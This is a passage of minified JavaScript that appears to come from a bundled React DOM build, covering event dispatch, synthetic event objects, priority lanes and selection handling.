Du(t,e){if(e){if(lx[t]&&(e.children!=null||e.dangerouslySetInnerHTML!=null))throw Error(se(137,t));if(e.dangerouslySetInnerHTML!=null){if(e.children!=null)throw Error(se(60));if(typeof e.dangerouslySetInnerHTML!="object"||!("__html"in e.dangerouslySetInnerHTML))throw Error(se(61))}if(e.style!=null&&typeof e.style!="object")throw Error(se(62))}}function Uu(t,e){if(t.indexOf("-")===-1)return typeof e.is=="string";switch(t){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var Ou=null;function Eh(t){return t=t.target||t.srcElement||window,t.correspondingUseElement&&(t=t.correspondingUseElement),t.nodeType===3?t.parentNode:t}var Fu=null,br=null,Sr=null;function Xp(t){if(t=Qa(t)){if(typeof Fu!="function")throw Error(se(280));var e=t.stateNode;e&&(e=Yl(e),Fu(t.stateNode,t.type,e))}}function Ig(t){br?Sr?Sr.push(t):Sr=[t]:br=t}function Dg(){if(br){var t=br,e=Sr;if(Sr=br=null,Xp(t),e)for(t=0;t<e.length;t++)Xp(e[t])}}function Ug(t,e){return t(e)}function Og(){}var vc=!1;function Fg(t,e,n){if(vc)return t(e,n);vc=!0;try{return Ug(t,e,n)}finally{vc=!1,(br!==null||Sr!==null)&&(Og(),Dg())}}function Aa(t,e){var n=t.stateNode;if(n===null)return null;var i=Yl(n);if(i===null)return null;n=i[e];e:switch(e){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(i=!i.disabled)||(t=t.type,i=!(t==="button"||t==="input"||t==="select"||t==="textarea")),t=!i;break e;default:t=!1}if(t)return null;if(n&&typeof n!="function")throw Error(se(231,e,typeof n));return n}var Bu=!1;if(ki)try{var Yr={};Object.defineProperty(Yr,"passive",{get:function(){Bu=!0}}),window.addEventListener("test",Yr,Yr),window.removeEventListener("test",Yr,Yr)}catch{Bu=!1}function cx(t,e,n,i,s,r,a,o,l){var c=Array.prototype.slice.call(arguments,3);try{e.apply(n,c)}catch(h){this.onError(h)}}var va=!1,ml=null,gl=!1,zu=null,ux={onError:function(t){va=!0,ml=t}};function dx(t,e,n,i,s,r,a,o,l){va=!1,ml=null,cx.apply(ux,arguments)}function hx(t,e,n,i,s,r,a,o,l){if(dx.apply(this,arguments),va){if(va){var c=ml;va=!1,ml=null}else throw Error(se(198));gl||(gl=!0,zu=c)}}function Gs(t){var e=t,n=t;if(t.alternate)for(;e.return;)e=e.return;else{t=e;do e=t,e.flags&4098&&(n=e.return),t=e.return;while(t)}return e.tag===3?n:null}function Bg(t){if(t.tag===13){var e=t.memoizedState;if(e===null&&(t=t.alternate,t!==null&&(e=t.memoizedState)),e!==null)return e.dehydrated}return null}function qp(t){if(Gs(t)!==t)throw Error(se(188))}function px(t){var e=t.alternate;if(!e){if(e=Gs(t),e===null)throw Error(se(188));return e!==t?null:t}for(var n=t,i=e;;){var s=n.return;if(s===null)break;var r=s.alternate;if(r===null){if(i=s.return,i!==null){n=i;continue}break}if(s.child===r.child){for(r=s.child;r;){if(r===n)return qp(s),t;if(r===i)return qp(s),e;r=r.sibling}throw Error(se(188))}if(n.return!==i.return)n=s,i=r;else{for(var a=!1,o=s.child;o;){if(o===n){a=!0,n=s,i=r;break}if(o===i){a=!0,i=s,n=r;break}o=o.sibling}if(!a){for(o=r.child;o;){if(o===n){a=!0,n=r,i=s;break}if(o===i){a=!0,i=r,n=s;break}o=o.sibling}if(!a)throw Error(se(189))}}if(n.alternate!==i)throw Error(se(190))}if(n.tag!==3)throw Error(se(188));return n.stateNode.current===n?t:e}function zg(t){return t=px(t),t!==null?Vg(t):null}function Vg(t){if(t.tag===5||t.tag===6)return t;for(t=t.child;t!==null;){var e=Vg(t);if(e!==null)return e;t=t.sibling}return null}var Hg=wn.unstable_scheduleCallback,Yp=wn.unstable_cancelCallback,fx=wn.unstable_shouldYield,mx=wn.unstable_requestPaint,wt=wn.unstable_now,gx=wn.unstable_getCurrentPriorityLevel,Th=wn.unstable_ImmediatePriority,Gg=wn.unstable_UserBlockingPriority,vl=wn.unstable_NormalPriority,vx=wn.unstable_LowPriority,Wg=wn.unstable_IdlePriority,Wl=null,ai=null;function yx(t){if(ai&&typeof ai.onCommitFiberRoot=="function")try{ai.onCommitFiberRoot(Wl,t,void 0,(t.current.flags&128)===128)}catch{}}var Yn=Math.clz32?Math.clz32:bx,xx=Math.log,_x=Math.LN2;function bx(t){return t>>>=0,t===0?32:31-(xx(t)/_x|0)|0}var mo=64,go=4194304;function da(t){switch(t&-t){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return t&4194240;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return t&130023424;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 1073741824;default:return t}}function yl(t,e){var n=t.pendingLanes;if(n===0)return 0;var i=0,s=t.suspendedLanes,r=t.pingedLanes,a=n&268435455;if(a!==0){var o=a&~s;o!==0?i=da(o):(r&=a,r!==0&&(i=da(r)))}else a=n&~s,a!==0?i=da(a):r!==0&&(i=da(r));if(i===0)return 0;if(e!==0&&e!==i&&!(e&s)&&(s=i&-i,r=e&-e,s>=r||s===16&&(r&4194240)!==0))return e;if(i&4&&(i|=n&16),e=t.entangledLanes,e!==0)for(t=t.entanglements,e&=i;0<e;)n=31-Yn(e),s=1<<n,i|=t[n],e&=~s;return i}function Sx(t,e){switch(t){case 1:case 2:case 4:return e+250;case 8:case 16:case 32:case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return e+5e3;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return-1;case 134217728:case 268435456:case 536870912:case 1073741824:return-1;default:return-1}}function wx(t,e){for(var n=t.suspendedLanes,i=t.pingedLanes,s=t.expirationTimes,r=t.pendingLanes;0<r;){var a=31-Yn(r),o=1<<a,l=s[a];l===-1?(!(o&n)||o&i)&&(s[a]=Sx(o,e)):l<=e&&(t.expiredLanes|=o),r&=~o}}function Vu(t){return t=t.pendingLanes&-1073741825,t!==0?t:t&1073741824?1073741824:0}function jg(){var t=mo;return mo<<=1,!(mo&4194240)&&(mo=64),t}function yc(t){for(var e=[],n=0;31>n;n++)e.push(t);return e}function Za(t,e,n){t.pendingLanes|=e,e!==536870912&&(t.suspendedLanes=0,t.pingedLanes=0),t=t.eventTimes,e=31-Yn(e),t[e]=n}function Mx(t,e){var n=t.pendingLanes&~e;t.pendingLanes=e,t.suspendedLanes=0,t.pingedLanes=0,t.expiredLanes&=e,t.mutableReadLanes&=e,t.entangledLanes&=e,e=t.entanglements;var i=t.eventTimes;for(t=t.expirationTimes;0<n;){var s=31-Yn(n),r=1<<s;e[s]=0,i[s]=-1,t[s]=-1,n&=~r}}function Ah(t,e){var n=t.entangledLanes|=e;for(t=t.entanglements;n;){var i=31-Yn(n),s=1<<i;s&e|t[i]&e&&(t[i]|=e),n&=~s}}var st=0;function Xg(t){return t&=-t,1<t?4<t?t&268435455?16:536870912:4:1}var qg,Ch,Yg,$g,Kg,Hu=!1,vo=[],es=null,ts=null,ns=null,Ca=new Map,Ra=new Map,qi=[],Ex="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");function $p(t,e){switch(t){case"focusin":case"focusout":es=null;break;case"dragenter":case"dragleave":ts=null;break;case"mouseover":case"mouseout":ns=null;break;case"pointerover":case"pointerout":Ca.delete(e.pointerId);break;case"gotpointercapture":case"lostpointercapture":Ra.delete(e.pointerId)}}function $r(t,e,n,i,s,r){return t===null||t.nativeEvent!==r?(t={blockedOn:e,domEventName:n,eventSystemFlags:i,nativeEvent:r,targetContainers:[s]},e!==null&&(e=Qa(e),e!==null&&Ch(e)),t):(t.eventSystemFlags|=i,e=t.targetContainers,s!==null&&e.indexOf(s)===-1&&e.push(s),t)}function Tx(t,e,n,i,s){switch(e){case"focusin":return es=$r(es,t,e,n,i,s),!0;case"dragenter":return ts=$r(ts,t,e,n,i,s),!0;case"mouseover":return ns=$r(ns,t,e,n,i,s),!0;case"pointerover":var r=s.pointerId;return Ca.set(r,$r(Ca.get(r)||null,t,e,n,i,s)),!0;case"gotpointercapture":return r=s.pointerId,Ra.set(r,$r(Ra.get(r)||null,t,e,n,i,s)),!0}return!1}function Zg(t){var e=Rs(t.target);if(e!==null){var n=Gs(e);if(n!==null){if(e=n.tag,e===13){if(e=Bg(n),e!==null){t.blockedOn=e,Kg(t.priority,function(){Yg(n)});return}}else if(e===3&&n.stateNode.current.memoizedState.isDehydrated){t.blockedOn=n.tag===3?n.stateNode.containerInfo:null;return}}}t.blockedOn=null}function Jo(t){if(t.blockedOn!==null)return!1;for(var e=t.targetContainers;0<e.length;){var n=Gu(t.domEventName,t.eventSystemFlags,e[0],t.nativeEvent);if(n===null){n=t.nativeEvent;var i=new n.constructor(n.type,n);Ou=i,n.target.dispatchEvent(i),Ou=null}else return e=Qa(n),e!==null&&Ch(e),t.blockedOn=n,!1;e.shift()}return!0}function Kp(t,e,n){Jo(t)&&n.delete(e)}function Ax(){Hu=!1,es!==null&&Jo(es)&&(es=null),ts!==null&&Jo(ts)&&(ts=null),ns!==null&&Jo(ns)&&(ns=null),Ca.forEach(Kp),Ra.forEach(Kp)}function Kr(t,e){t.blockedOn===e&&(t.blockedOn=null,Hu||(Hu=!0,wn.unstable_scheduleCallback(wn.unstable_NormalPriority,Ax)))}function ka(t){function e(s){return Kr(s,t)}if(0<vo.length){Kr(vo[0],t);for(var n=1;n<vo.length;n++){var i=vo[n];i.blockedOn===t&&(i.blockedOn=null)}}for(es!==null&&Kr(es,t),ts!==null&&Kr(ts,t),ns!==null&&Kr(ns,t),Ca.forEach(e),Ra.forEach(e),n=0;n<qi.length;n++)i=qi[n],i.blockedOn===t&&(i.blockedOn=null);for(;0<qi.length&&(n=qi[0],n.blockedOn===null);)Zg(n),n.blockedOn===null&&qi.shift()}var wr=Ui.ReactCurrentBatchConfig,xl=!0;function Cx(t,e,n,i){var s=st,r=wr.transition;wr.transition=null;try{st=1,Rh(t,e,n,i)}finally{st=s,wr.transition=r}}function Rx(t,e,n,i){var s=st,r=wr.transition;wr.transition=null;try{st=4,Rh(t,e,n,i)}finally{st=s,wr.transition=r}}function Rh(t,e,n,i){if(xl){var s=Gu(t,e,n,i);if(s===null)Cc(t,e,i,_l,n),$p(t,i);else if(Tx(s,t,e,n,i))i.stopPropagation();else if($p(t,i),e&4&&-1<Ex.indexOf(t)){for(;s!==null;){var r=Qa(s);if(r!==null&&qg(r),r=Gu(t,e,n,i),r===null&&Cc(t,e,i,_l,n),r===s)break;s=r}s!==null&&i.stopPropagation()}else Cc(t,e,i,null,n)}}var _l=null;function Gu(t,e,n,i){if(_l=null,t=Eh(i),t=Rs(t),t!==null)if(e=Gs(t),e===null)t=null;else if(n=e.tag,n===13){if(t=Bg(e),t!==null)return t;t=null}else if(n===3){if(e.stateNode.current.memoizedState.isDehydrated)return e.tag===3?e.stateNode.containerInfo:null;t=null}else e!==t&&(t=null);return _l=t,null}function Jg(t){switch(t){case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 1;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"toggle":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 4;case"message":switch(gx()){case Th:return 1;case Gg:return 4;case vl:case vx:return 16;case Wg:return 536870912;default:return 16}default:return 16}}var Ki=null,kh=null,Qo=null;function Qg(){if(Qo)return Qo;var t,e=kh,n=e.length,i,s="value"in Ki?Ki.value:Ki.textContent,r=s.length;for(t=0;t<n&&e[t]===s[t];t++);var a=n-t;for(i=1;i<=a&&e[n-i]===s[r-i];i++);return Qo=s.slice(t,1<i?1-i:void 0)}function el(t){var e=t.keyCode;return"charCode"in t?(t=t.charCode,t===0&&e===13&&(t=13)):t=e,t===10&&(t=13),32<=t||t===13?t:0}function yo(){return!0}function Zp(){return!1}function En(t){function e(n,i,s,r,a){this._reactName=n,this._targetInst=s,this.type=i,this.nativeEvent=r,this.target=a,this.currentTarget=null;for(var o in t)t.hasOwnProperty(o)&&(n=t[o],this[o]=n?n(r):r[o]);return this.isDefaultPrevented=(r.defaultPrevented!=null?r.defaultPrevented:r.returnValue===!1)?yo:Zp,this.isPropagationStopped=Zp,this}return vt(e.prototype,{preventDefault:function(){this.defaultPrevented=!0;var n=this.nativeEvent;n&&(n.preventDefault?n.preventDefault():typeof n.returnValue!="unknown"&&(n.returnValue=!1),this.isDefaultPrevented=yo)},stopPropagation:function(){var n=this.nativeEvent;n&&(n.stopPropagation?n.stopPropagation():typeof n.cancelBubble!="unknown"&&(n.cancelBubble=!0),this.isPropagationStopped=yo)},persist:function(){},isPersistent:yo}),e}var Vr={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(t){return t.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},Lh=En(Vr),Ja=vt({},Vr,{view:0,detail:0}),kx=En(Ja),xc,_c,Zr,jl=vt({},Ja,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:Ph,button:0,buttons:0,relatedTarget:function(t){return t.relatedTarget===void 0?t.fromElement===t.srcElement?t.toElement:t.fromElement:t.relatedTarget},movementX:function(t){return"movementX"in t?t.movementX:(t!==Zr&&(Zr&&t.type==="mousemove"?(xc=t.screenX-Zr.screenX,_c=t.screenY-Zr.screenY):_c=xc=0,Zr=t),xc)},movementY:function(t){return"movementY"in t?t.movementY:_c}}),Jp=En(jl),Lx=vt({},jl,{dataTransfer:0}),Px=En(Lx),Nx=vt({},Ja,{relatedTarget:0}),bc=En(Nx),Ix=vt({},Vr,{animationName:0,elapsedTime:0,pseudoElement:0}),Dx=En(Ix),Ux=vt({},Vr,{clipboardData:function(t){return"clipboardData"in t?t.clipboardData:window.clipboardData}}),Ox=En(Ux),Fx=vt({},Vr,{data:0}),Qp=En(Fx),Bx={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},zx={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},Vx={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function Hx(t){var e=this.nativeEvent;return e.getModifierState?e.getModifierState(t):(t=Vx[t])?!!e[t]:!1}function Ph(){return Hx}var Gx=vt({},Ja,{key:function(t){if(t.key){var e=Bx[t.key]||t.key;if(e!=="Unidentified")return e}return t.type==="keypress"?(t=el(t),t===13?"Enter":String.fromCharCode(t)):t.type==="keydown"||t.type==="keyup"?zx[t.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:Ph,charCode:function(t){return t.type==="keypress"?el(t):0},keyCode:function(t){return t.type==="keydown"||t.type==="keyup"?t.keyCode:0},which:function(t){return t.type==="keypress"?el(t):t.type==="keydown"||t.type==="keyup"?t.keyCode:0}}),Wx=En(Gx),jx=vt({},jl,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0}),ef=En(jx),Xx=vt({},Ja,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:Ph}),qx=En(Xx),Yx=vt({},Vr,{propertyName:0,elapsedTime:0,pseudoElement:0}),$x=En(Yx),Kx=vt({},jl,{deltaX:function(t){return"deltaX"in t?t.deltaX:"wheelDeltaX"in t?-t.wheelDeltaX:0},deltaY:function(t){return"deltaY"in t?t.deltaY:"wheelDeltaY"in t?-t.wheelDeltaY:"wheelDelta"in t?-t.wheelDelta:0},deltaZ:0,deltaMode:0}),Zx=En(Kx),Jx=[9,13,27,32],Nh=ki&&"CompositionEvent"in window,ya=null;ki&&"documentMode"in document&&(ya=document.documentMode);var Qx=ki&&"TextEvent"in window&&!ya,ev=ki&&(!Nh||ya&&8<ya&&11>=ya),tf=" ",nf=!1;function tv(t,e){switch(t){case"keyup":return Jx.indexOf(e.keyCode)!==-1;case"keydown":return e.keyCode!==229;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function nv(t){return t=t.detail,typeof t=="object"&&"data"in t?t.data:null}var cr=!1;function e_(t,e){switch(t){case"compositionend":return nv(e);case"keypress":return e.which!==32?null:(nf=!0,tf);case"textInput":return t=e.data,t===tf&&nf?null:t;default:return null}}function t_(t,e){if(cr)return t==="compositionend"||!Nh&&tv(t,e)?(t=Qg(),Qo=kh=Ki=null,cr=!1,t):null;switch(t){case"paste":return null;case"keypress":if(!(e.ctrlKey||e.altKey||e.metaKey)||e.ctrlKey&&e.altKey){if(e.char&&1<e.char.length)return e.char;if(e.which)return String.fromCharCode(e.which)}return null;case"compositionend":return ev&&e.locale!=="ko"?null:e.data;default:return null}}var n_={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function sf(t){var e=t&&t.nodeName&&t.nodeName.toLowerCase();return e==="input"?!!n_[t.type]:e==="textarea"}function iv(t,e,n,i){Ig(i),e=bl(e,"onChange"),0<e.length&&(n=new Lh("onChange","change",null,n,i),t.push({event:n,listeners:e}))}var xa=null,La=null;function i_(t){fv(t,0)}function Xl(t){var e=hr(t);if(Ag(e))return t}function s_(t,e){if(t==="change")return e}var sv=!1;if(ki){var Sc;if(ki){var wc="oninput"in document;if(!wc){var rf=document.createElement("div");rf.setAttribute("oninput","return;"),wc=typeof rf.oninput=="function"}Sc=wc}else Sc=!1;sv=Sc&&(!document.documentMode||9<document.documentMode)}function af(){xa&&(xa.detachEvent("onpropertychange",rv),La=xa=null)}function rv(t){if(t.propertyName==="value"&&Xl(La)){var e=[];iv(e,La,t,Eh(t)),Fg(i_,e)}}function r_(t,e,n){t==="focusin"?(af(),xa=e,La=n,xa.attachEvent("onpropertychange",rv)):t==="focusout"&&af()}function a_(t){if(t==="selectionchange"||t==="keyup"||t==="keydown")return Xl(La)}function o_(t,e){if(t==="click")return Xl(e)}function l_(t,e){if(t==="input"||t==="change")return Xl(e)}function c_(t,e){return t===e&&(t!==0||1/t===1/e)||t!==t&&e!==e}var Kn=typeof Object.is=="function"?Object.is:c_;function Pa(t,e){if(Kn(t,e))return!0;if(typeof t!="object"||t===null||typeof e!="object"||e===null)return!1;var n=Object.keys(t),i=Object.keys(e);if(n.length!==i.length)return!1;for(i=0;i<n.length;i++){var s=n[i];if(!Eu.call(e,s)||!Kn(t[s],e[s]))return!1}return!0}function of(t){for(;t&&t.firstChild;)t=t.firstChild;return t}function lf(t,e){var n=of(t);t=0;for(var i;n;){if(n.nodeType===3){if(i=t+n.textContent.length,t<=e&&i>=e)return{node:n,offset:e-t};t=i}e:{for(;n;){if(n.nextSibling){n=n.nextSibling;break e}n=n.parentNode}n=void 0}n=of(n)}}function av(t,e){return t&&e?t===e?!0:t&&t.nodeType===3?!1:e&&e.nodeType===3?av(t,e.parentNode):"contains"in t?t.contains(e):t.compareDocumentPosition?!!(t.compareDocumentPosition(e)&16):!1:!1}function ov(){for(var t=window,e=fl();e instanceof t.HTMLIFrameElement;){try{var n=typeof e.contentWindow.location.href=="string"}catch{n=!1}if(n)t=e.contentWindow;else break;e=fl(t.document)}return e}function Ih(t){var e=t&&t.nodeName&&t.nodeName.toLowerCase();return e&&(e==="input"&&(t.type==="text"||t.type==="search"||t.type==="tel"||t.type==="url"||t.type==="password")||e==="textarea"||t.contentEditable==="true")}function u_(t){var e=ov(),n=t.focusedElem,i=t.selectionRange;if(e!==n&&n&&n.ownerDocument&&av(n.ownerDocument.documentElement,n)){if(i!==null&&Ih(n)){if(e=i.start,t=i.end,t===void 0&&(t=e),"selectionStart"in n)n.selectionStart=e,n.selectionEnd=Math.min(t,n.value.length);else if(t=(e=n.ownerDocument||document)&&e.defaultView||window,t.getSelection){t=t.getSelection();var s=n.textContent.length,r=Math.min(i.start,s);i=i.end===void 0?r:Math.min(i.end,s),!t.extend&&r>i&&(s=i,i=r,r=s),s=lf(n,r);var a=lf(n,i);s&&a&&(t.rangeCount!==1||t.anchorNode!==s.node||t.anchorOffset!==s.offset||t.focusNode!==a.node||t.focusOffset!==a.offset)&&(e=e.createRange(),e.setStart(s.node,s.offset),t.removeAllRanges(),r>i?(t.addRange(e),t.extend(a.node,a.offset)):(e.setEnd(a.node,a.offset),t.addRange(e)))}}for(e=[],t=n;t=t.parentNode;)t.nodeType===1&&e.push({element:t,left:t.scrollLeft,top:t.scrollTop});for(typeof n.focus=="function"&&n.focus(),n=0;n<e.length;n++)t=e[n],t.element.scrollLeft=t.left,t.element.scrollTop=t.top}}var d_=ki&&"documentMode"in document&&11>=document.documentMode,ur=null,Wu=null,_a=null,ju=!1;function cf(t,e,n){var i=n.window===n?n.document:n.nodeType===9?n:n.ownerDocument;ju||ur==null||ur!==fl(i)||(i=ur,"selectionStart"in i&&Ih(i)?i={start:i.selectionStart,end:i.selectionEnd}:(i=(i.ownerDocument&&i.ownerDocument.defaultView||window).getSelection(),i={anchorNode:i.anchorNode,anchorOffset:i.anchorOffset,focusNode:i.focusNode,focusOffset:i.focusOffset}),_a&&Pa(_a,i)||(_a=i,i=bl(Wu,"onSelect"),0<i.length&&(e=new Lh("onSelect","select",null,e,n),t.push({event:e,listeners:i}),e.target=ur)))}function xo(t,e){var n={};return n[t.toLowerCase()]=e.toLowerCase(),n["Webkit"+t]="webkit"+e,n["Moz"+t]="moz"+e,n}var dr={animationend:xo("Animation","AnimationEnd"),animationiteration:xo("Animation","AnimationIteration"),animationstart:xo("Animation","AnimationStart"),transitionend:xo("Transition","TransitionEnd")},Mc={},lv={};ki&&(lv=document.createElement("div").style,"AnimationEvent"in window||(delete dr.animationend.animation,delete dr.animationiteration.animation,delete dr.animationstart.animation),"TransitionEvent"in window||delete dr.transitionend.transition);function ql(t){if(Mc[t])return Mc[t];if(!dr[t])return t;var e=dr[t],n;for(n in e)if(e.hasOwnProperty(n)&&n in lv)return Mc[t]=e[n];return t}var cv=ql("animationend"),uv=ql("animationiteration"),dv=ql("animationstart"),hv=ql("transitionend"),pv=new Map,uf="abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");function hs(t,e){pv.set(t,e),Hs(e,[t])}for(var Ec=0;Ec<uf.length;Ec++){var Tc=uf[Ec],h_=Tc.toLowerCase(),p_=Tc[0].toUpperCase()+Tc.slice(1);hs(h_,"on"+p_)}hs(cv,"onAnimationEnd");hs(uv,"onAnimationIteration");hs(dv,"onAnimationStart");hs("dblclick","onDoubleClick");hs("focusin","onFocus");hs("focusout","onBlur");hs(hv,"onTransitionEnd");Cr("onMouseEnter",["mouseout","mouseover"]);Cr("onMouseLeave",["mouseout","mouseover"]);Cr("onPointerEnter",["pointerout","pointerover"]);Cr("onPointerLeave",["pointerout","pointerover"]);Hs("onChange","change click focusin focusout input keydown keyup selectionchange".split(" "));Hs("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" "));Hs("onBeforeInput",["compositionend","keypress","textInput","paste"]);Hs("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" "));Hs("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" "));Hs("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var ha="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),f_=new Set("cancel close invalid load scroll toggle".split(" ").concat(ha));function df(t,e,n){var i=t.type||"unknown-event";t.currentTarget=n,hx(i,e,void 0,t),t.currentTarget=null}function fv(t,e){e=(e&4)!==0;for(var n=0;n<t.length;n++){var i=t[n],s=i.event;i=i.listeners;e:{var r=void 0;if(e)for(var a=i.length-1;0<=a;a--){var o=i[a],l=o.instance,c=o.currentTarget;if(o=o.listener,l!==r&&s.isPropagationStopped())break e;df(s,o,c),r=l}else for(a=0;a<i.length;a++){if(o=i[a],l=o.instance,c=o.currentTarget,o=o.listener,l!==r&&s.isPropagationStopped())break e;df(s,o,c),r=l}}}if(gl)throw t=zu,gl=!1,zu=null,t}function ht(t,e){var n=e[Ku];n===void 0&&(n=e[Ku]=new Set);var i=t+"__bubble";n.has(i)||(mv(e,t,2,!1),n.add(i))}function Ac(t,e,n){var i=0;e&&(i|=4),mv(n,t,i,e)}var _o="_reactListening"+Math.random().toString(36).slice(2);function Na(t){if(!t[_o]){t[_o]=!0,Sg.forEach(function(n){n!=="selectionchange"&&(f_.has(n)||Ac(n,!1,t),Ac(n,!0,t))});var e=t.nodeType===9?t:t.ownerDocument;e===null||e[_o]||(e[_o]=!0,Ac("selectionchange",!1,e))}}function mv(t,e,n,i){switch(Jg(e)){case 1:var s=Cx;break;case 4:s=Rx;break;default:s=Rh}n=s.bind(null,e,n,t),s=void 0,!Bu||e!=="touchstart"&&e!=="touchmove"&&e!=="wheel"||(s=!0),i?s!==void 0?t.addEventListener(e,n,{capture:!0,passive:s}):t.addEventListener(e,n,!0):s!==void 0?t.addEventListener(e,n,{passive:s}):t.addEventListener(e,n,!1)}function Cc(t,e,n,i,s){var r=i;if(!(e&1)&&!(e&2)&&i!==null)e:for(;;){if(i===null)return;var a=i.tag;if(a===3||a===4){var o=i.stateNode.containerInfo;if(o===s||o.nodeType===8&&o.parentNode===s)break;if(a===4)for(a=i.return;a!==null;){var l=a.tag;if((l===3||l===4)&&(l=a.stateNode.containerInfo,l===s||l.nodeType===8&&l.parentNode===s))return;a=a.return}for(;o!==null;){if(a=Rs(o),a===null)return;if(l=a.tag,l===5||l===6){i=r=a;continue e}o=o.parentNode}}i=i.return}Fg(function(){var c=r,h=Eh(n),d=[];e:{var p=pv.get(t);if(p!==void 0){var f=Lh,y=t;switch(t){case"keypress":if(el(n)===0)break e;case"keydown":case"keyup":f=Wx;break;case"focusin":y="focus",f=bc;break;case"focusout":y="blur",f=bc;break;case"beforeblur":case"afterblur":f=bc;break;case"click":if(n.button===2)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":f=Jp;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":f=Px;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":f=qx;break;case cv:case uv:case dv:f=Dx;break;case hv:f=$x;break;case"scroll":f=kx;break;case"wheel":f=Zx;break;case"copy":case"cut":case"paste":f=Ox;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":f=ef}var _=(e&4)!==0,g=!_&&t==="scroll",u=_?p!==null?p+"Capture":null:p;_=[];for(var v=c,x;v!==null;){x=v;var S=x.stateNode;if(x.tag===5&&S!==null&&(x=S,u!==null&&(S=Aa(v,u),S!=null&&_.push(Ia(v,S,x)))),g)break;v=v.return}0<_.length&&(p=new f(p,y,null,n,h),d.push({event:p,listeners:_}))}}if(!(e&7)){e:{if(p=t==="mouseover"||t==="pointerover",f=t==="mouseout"||t==="pointerout",p&&n!==Ou&&(y=n.relatedTarget||n.fromElement)&&(Rs(y)||y[Li]))break 